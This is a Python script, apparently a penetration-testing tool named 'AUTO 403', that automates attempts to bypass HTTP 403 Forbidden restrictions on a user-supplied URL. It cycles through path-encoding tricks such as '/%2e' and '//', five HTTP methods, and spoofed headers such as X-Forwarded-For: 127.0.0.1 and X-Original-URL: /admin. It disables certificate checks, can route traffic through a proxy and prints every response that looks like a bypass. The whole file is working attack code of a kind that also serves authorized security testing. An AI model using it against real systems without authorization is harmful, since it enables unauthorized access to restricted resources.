import requests
from colorama import Fore, Style, init
import urllib3

urllib3.disable_warnings()
init(autoreset=True)

BANNER = f"""
{Style.BRIGHT}{Fore.RED}

 █████╗ ██╗   ██╗████████╗ ██████╗     ██╗  ██╗ ██████╗ ██████╗ 
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██║  ██║██╔═████╗╚════██╗
███████║██║   ██║   ██║   ██║   ██║    ███████║██║██╔██║ █████╔╝
██╔══██║██║   ██║   ██║   ██║   ██║    ╚════██║████╔╝██║ ╚═══██╗
██║  ██║╚██████╔╝   ██║   ╚██████╔╝         ██║╚██████╔╝██████╔╝
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝          ╚═╝ ╚═════╝ ╚═════╝ v0.1
{Fore.YELLOW}
        Automated 403 Forbidden Bypass Testing Tool
{Fore.CYAN}
              * Supports Proxies
{Fore.WHITE}
              # Coded By Mohamed.elsay3d
{Style.RESET_ALL}
"""

BASE_HEADERS = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=1000",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
}

PATH_PAYLOADS = [
    "",
    "/",
    "/.",
    "//",
    "/%2e",
    "%2f"
]

METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT"]

HEADER_PAYLOADS = [
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
]

def merge_headers(base, payload):
    headers = base.copy()
    headers.update(payload)
    return headers

def bypass_403(url, proxies=None):
    all_reqs = 0
    success_reqs = 0

    for path in PATH_PAYLOADS:
        test_url = url.rstrip("/") + path
        for method in METHODS:
            for payload in HEADER_PAYLOADS:
                headers = merge_headers(BASE_HEADERS, payload)
                try:
                    r = requests.request(
                        method=method,
                        url=test_url,
                        headers=headers,
                        timeout=5,
                        allow_redirects=True,
                        proxies=proxies,
                        verify=False
                    )

                    all_reqs += 1

                    if r.status_code not in [403, 404, 405]:
                        color = Fore.GREEN if r.status_code < 400 else Fore.YELLOW

                        print(f"{' '*30}\n{Style.BRIGHT}{Fore.GREEN}[+] BYPASS FOUND{Style.RESET_ALL}")
                        print(f"{Fore.WHITE}URL     : {test_url}")
                        print(f"Method  : {method}")
                        print(f"Headers : {payload}")
                        print(f"Status  : {color}{r.status_code}{Style.RESET_ALL}")
                        print(f"Length  : {len(r.content)}")

                        success_reqs += 1
                    else:
                        print(
                            f"{Fore.CYAN}[>] Requests: {all_reqs} | Success: {success_reqs}{Style.RESET_ALL}",
                            end="\r"
                        )

                except requests.RequestException:
                    print(f"{Fore.RED}[-] Request Failed{Style.RESET_ALL}")



if __name__ == "__main__":
    print(BANNER)

    target = input(f"{Fore.WHITE}[?] Enter forbidden URL: {Style.RESET_ALL}").strip()
    proxy_input = input(f"{Fore.WHITE}[?] Enter proxy (ip:port) or leave empty: {Style.RESET_ALL}").strip()

    proxies = None
    if proxy_input:
        proxies = {
            "http": f"http://{proxy_input}",
            "https": f"http://{proxy_input}",
        }
        print(f"{Fore.YELLOW}[i] Proxy Enabled : {proxy_input}{Style.RESET_ALL}")

    bypass_403(target, proxies)